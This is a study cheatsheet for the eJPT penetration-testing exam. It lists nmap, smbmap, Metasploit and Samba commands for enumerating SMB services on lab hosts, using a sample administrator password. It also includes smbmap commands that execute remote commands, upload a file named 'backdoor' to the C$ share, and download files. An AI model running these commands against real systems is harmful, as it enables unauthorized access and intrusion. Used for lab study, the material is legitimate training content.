## eJPT-Cheatsheet For Exam/Studying


## NMAP
```
nmap -Pn 127.0.0.1
```
-Pn skip host discovery
-sV is used to determine the application version information
-p- scans all port 
-T4 Fast Scan Makes a lot of noise 
-sU udp scan 

## SMB 
```
nmap -p445 --script smb-protocols IPADDRESS #protocols
nmap -p445 --script smb-security-mode IPADDRESS
nmap -p445 --script smb-enum-sessions IPADDRESS
nmap -p445 --script smb-enum-shares 10.0.17.200
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.2
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-protocols 10.0.28.123
```

## SMBMAP
```
smbmap -u guest -p "" -d . -H 10.0.28.123
smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123
smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
```

## SAMBA 
```
nmap -sU --top-ports 25 192.126.66.3
nmap -sV -p 445 192.126.66.3
nmap --script smb-os-discovery.nse -p 445 192.126.66.3

msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.126.66.3
exploit

nmap --script smb-os-discovery.nse -p 445 192.126.66.3
nmblookup -A 192.126.66.3
smbclient -L 192.126.66.3 -N
rpcclient -U "" -N 192.126.66.3

```
